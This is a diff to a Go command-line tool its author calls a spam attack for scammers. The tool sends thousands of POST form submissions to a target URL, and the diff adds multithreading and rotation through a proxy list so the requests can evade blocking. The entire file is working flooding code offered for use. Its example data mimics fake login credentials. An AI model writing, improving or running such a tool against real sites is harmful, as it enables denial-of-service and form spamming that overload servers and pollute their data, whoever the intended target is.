@@ -1,13 +1,14 @@
 /**
-	* hope it helps u 							*
-	* By Nikita Vtorushin<n.vtorushin@inbox.ru> *
-	* @nikitavoryet 							*
-	* GoLang spam atack for scammers			*
+	* hope it helps u 							 *
+	* By Nikita Vtorushin <n.vtorushin@inbox.ru> *
+	* @https://t.me/nvtorushin 					 *
+	* GoLang spam example OSINT      			 *
 **/
 
 package main
 
 import (
+	"bufio"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -15,6 +16,9 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
+	"strings"
+	"sync"
 	"time"
 )
 
@@ -27,37 +31,78 @@ func main() {
 	attackUrl := flag.String("url", "", "attackUrl spam attack")
 	method := flag.String("method", "POST", "method for attack (POST/GET)")
 	count := flag.Int("count", 10000, "count for attack")
-	_data := flag.String("data", ``, "data for attack")
+	data := flag.String("data", ``, "data for attack")
+	proxyFile := flag.String("proxyfile", "", "file containing proxies (one per line)")
+	threads := flag.Int("threads", 1, "number of threads for attack")
 	flag.Parse()
 
-	var data url.Values
+	var requestData url.Values
 
 	if *attackUrl != "" {
 
-		if *_data != "" {
-			_body := getData(*method, *_data)
-			data = _body
+		if *data != "" {
+			requestData = getData(*method, *data)
+		}
+
+		var proxies []string
+		if *proxyFile != "" {
+			proxies = readProxiesFromFile(*proxyFile)
 		}
 
 		rand.Seed(time.Now().UnixNano())
-		for i := 0; i < *count; i++ {
-			if i%5 == 0 {
-				fmt.Println("Sended count:", i, "Good:", completeCount, "Bad:", errorCount)
-			}
-			go startAttack(*attackUrl, *method, data)
-			time.Sleep(time.Millisecond)
+		totalRequests := *count
+
+		var wg sync.WaitGroup
+		wg.Add(*threads)
+
+		for i := 1; i <= *threads; i++ {
+			go runAttacks(*attackUrl, *method, requestData, proxies, totalRequests, i, &wg)
 		}
+
+		wg.Wait()
+
 		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
 	} else {
 		fmt.Println("Set variable -url")
 	}
 }
 
-func startAttack(attackUrl string, method string, data url.Values) bool {
-	resp, err := http.PostForm(attackUrl, data)
+func runAttacks(attackUrl string, method string, data url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	for i := 0; i < count; i++ {
+		if i%5 == 0 {
+			fmt.Println("Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
+		}
+		startAttack(attackUrl, method, data, proxies, threadIndex)
+	}
+}
+
+func startAttack(attackUrl string, method string, data url.Values, proxies []string, threadIndex int) {
+	client := &http.Client{}
+
+	// Проверяем наличие прокси перед использованием
+	if len(proxies) > 0 {
+		// Выбираем прокси циклически, основываясь на уникальном индексе потока
+		proxyIndex := (threadIndex - 1) % len(proxies)
+
+		// Добавляем поддержку прокси, если указано
+		proxy := proxies[proxyIndex]
+		if proxy != "" {
+			proxyUrl, err := url.Parse(proxy)
+			if err == nil {
+				client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
+			} else {
+				fmt.Println("Error parsing proxy URL:", err)
+				return
+			}
+		}
+	}
+
+	resp, err := client.PostForm(attackUrl, data)
 
 	if err != nil {
-		fmt.Println("Site not available: ", attackUrl, "\nERROR:")
+		fmt.Println("Site not available:", attackUrl, "\nERROR:", err)
 		errorCount++
 	} else {
 		defer resp.Body.Close()
@@ -77,7 +122,6 @@ func startAttack(attackUrl string, method string, data url.Values) bool {
 			completeCount++
 		}
 	}
-	return true
 }
 
 func log(data any) {
@@ -94,11 +138,6 @@ func getData(method string, data string) url.Values {
 	}
 }
 
-/**
- * Format JSON to url.Values
- * Example JSON:
- * {"email": "test@inbox.ru","password": "123test321"}
- */
 func getFormatPostData(body []byte) url.Values {
 	m := map[string]string{}
 	if err := json.Unmarshal(body, &m); err != nil {
@@ -110,6 +149,30 @@ func getFormatPostData(body []byte) url.Values {
 	}
 
 	return _body
+}
+
+func readProxiesFromFile(file string) []string {
+	var proxies []string
+	f, err := os.Open(file)
+	if err != nil {
+		fmt.Println("Error opening proxy file:", err)
+		return proxies
+	}
+	defer f.Close()
+
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		proxy := strings.TrimSpace(scanner.Text())
+		if proxy != "" {
+			proxies = append(proxies, proxy)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading proxy file:", err)
+	}
+
+	return proxies
 }
 
 func getFormatGetData() {}
